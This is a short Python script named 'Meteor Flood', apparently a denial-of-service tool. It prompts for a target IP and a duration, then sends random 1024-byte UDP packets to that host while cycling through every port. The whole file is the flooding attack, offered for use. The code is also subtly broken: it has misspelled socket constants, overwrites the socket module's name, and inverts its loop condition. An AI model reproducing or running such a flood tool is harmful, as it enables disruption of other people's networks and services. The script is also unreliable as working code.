import random
import sys
import os
import socket
import time

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    """"
    Banner Coming soon
    till then injoy 
    without it 
    hope its okay
    """


def exeet():
    print("\nThanks For Using Meteor Flood..")
    print("\tWe Hope To See You Again")



clr()
banner()
port = 1
ip = input("\nEnter IP: ")
dur = int(input("\tenter Duration:"))
bytes = os.urandom(1024)
socket = socket.socket(socket.AFINET, socket.SOCKDGRAM)
sent = int(0)
timeout = time.time()+dur
print
while True and time.time()>timeout:
    clr()
    banner()
    try:
        socket.sendto(bytes,(ip, port))
        sent = sent+1
        if port == 65535:
            port = 1
        else:
            port = port+1
            print(sent, ip, port)
    except KeyboardInterrupt:
        exeet()
        sys.exit()

